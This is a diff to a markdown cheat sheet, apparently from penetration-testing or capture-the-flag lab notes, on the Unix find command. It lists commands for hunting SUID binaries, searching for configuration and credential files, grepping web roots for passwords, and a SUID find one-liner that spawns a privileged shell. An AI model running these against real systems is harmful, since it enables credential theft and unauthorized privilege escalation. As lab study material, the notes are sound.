@@ -7,6 +7,7 @@ The `find` utility is the primary file and directory search tool on Unix-like op
 ## Commands Used
 
 ### Hunting for SUID/SGID Binaries
+<!-- cmd: linux -->
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
@@ -18,6 +19,7 @@ Used on: **DevArea**, **Gaara**, **vulnversity**, **Binex**, **blog**, **booksto
 - `2>/dev/null` — suppresses "Permission denied" errors for clean output.
 
 ### Searching for Configuration and Credential Files
+<!-- cmd: linux -->
 ```bash
 find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | grep -v proc
 find / -name "*.yml" -o -name "*.yaml" -o -name "docker-compose*" 2>/dev/null
@@ -28,6 +30,7 @@ Used on: **Kobold**, **Silentium**, **cctv**, **Ide**, **Internal**, **bibliotec
 - `grep -v proc` — excludes the noisy `/proc` filesystem from the results.
 
 ### Finding Files Owned by Specific Users or Groups
+<!-- cmd: linux -->
 ```bash
 find / -user drac 2>/dev/null
 find / -group admin 2>/dev/null
@@ -40,6 +43,7 @@ Used on: **Ide**, **Team**, **yueiua**
 - `-executable` — filters results to files the current user has execution rights for.
 
 ### Executing Commands on Found Files (Credential Grepping)
+<!-- cmd: linux -->
 ```bash
 find /var/www/html -type f -exec grep -l -i "password\|DB_PASSWORD" {} \; 2>/dev/null
 ```
@@ -50,6 +54,7 @@ Used on: **billing**, **vulnnetinternal**
 - `\;` — terminates the `-exec` command.
 
 ### Escalating Privileges via SUID `find`
+<!-- cmd: linux -->
 ```bash
 find . -exec /bin/sh -p \; -quit
 ```
